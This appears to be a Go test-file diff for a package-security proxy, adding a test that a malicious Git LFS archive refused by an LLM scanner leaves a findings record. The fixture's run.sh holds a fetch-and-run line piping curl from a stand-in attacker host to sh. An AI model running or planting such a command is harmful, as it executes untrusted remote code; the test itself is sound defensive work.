@@ -23,6 +23,7 @@ import (
 	"github.com/blechschmidt/pullthrough-security/internal/backends/httpbackend"
 	"github.com/blechschmidt/pullthrough-security/internal/cache"
 	"github.com/blechschmidt/pullthrough-security/internal/cachefed"
+	"github.com/blechschmidt/pullthrough-security/internal/findings"
 	"github.com/blechschmidt/pullthrough-security/internal/intercept"
 	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
 	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
@@ -948,6 +949,57 @@ func TestLLMGateGitLFSObject(t *testing.T) {
 	}
 	if off.provider.Calls() != 0 {
 		t.Error("an excluded ecosystem's object was sent to the model")
+	}
+}
+
+// The Git backend calls the gate itself, ahead of the gateway's pull pipeline,
+// where a findings document is recorded on every other serve path. A refused LFS
+// object must leave one all the same: the SARIF export, the dossier and the SIEM
+// forward read the findings store, not the audit log.
+func TestLLMGateGitLFSObjectRecordsAFinding(t *testing.T) {
+	store := findings.NewStore(findings.StoreOptions{})
+	fx := newLLMPaths(t, llmPathsOptions{deps: func(d *Dependencies) { d.Findings = store }})
+	ctx := context.Background()
+	gate := func(body []byte) (string, bool) {
+		digest := pkgscantest.Digest(body)
+		oid := strings.TrimPrefix(digest, "sha256:")
+		if _, err := fx.cache.Put(ctx, digest, bytes.NewReader(body), nil); err != nil {
+			t.Fatalf("seeding the cache: %v", err)
+		}
+		req := httptest.NewRequest(http.MethodGet, "/v1/git/org/repo.git/info/lfs/objects/"+oid, nil)
+		return oid, fx.g.GateLFSObject(httptest.NewRecorder(), req, "git", "org/repo.git", oid, int64(len(body)), digest)
+	}
+
+	evil := pkgscantest.Zip(map[string]string{"run.sh": "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"})
+	oid, admitted := gate(evil)
+	if admitted {
+		t.Fatal("a malicious archive committed through LFS was admitted")
+	}
+	doc, ok := store.Get("", "org/repo.git@"+oid)
+	if !ok {
+		t.Fatalf("the refusal of the LFS object left no findings document (%d documents)", store.Len())
+	}
+	if doc.Artifact.Ecosystem != llmpkgscan.EcosystemGitLFS || doc.Artifact.Digest != "sha256:"+oid {
+		t.Errorf("the document is for %s %s, want the git-lfs object sha256:%s", doc.Artifact.Ecosystem, doc.Artifact.Digest, oid)
+	}
+	found := false
+	for _, f := range doc.Findings {
+		if f.RuleID == findings.RuleLLMMaliciousPackage {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("the document has no %s finding: %+v", findings.RuleLLMMaliciousPackage, doc.Findings)
+	}
+
+	// An admitted object is recorded too — with nothing against it.
+	clean := pkgscantest.Zip(map[string]string{"README.md": "model card\n"})
+	oid, admitted = gate(clean)
+	if !admitted {
+		t.Fatal("a benign archive committed through LFS was refused")
+	}
+	if doc, ok := store.Get("", "org/repo.git@"+oid); !ok || doc.HasBlocking() {
+		t.Errorf("the admitted object: document recorded=%v, blocking=%v", ok, ok && doc.HasBlocking())
 	}
 }
 
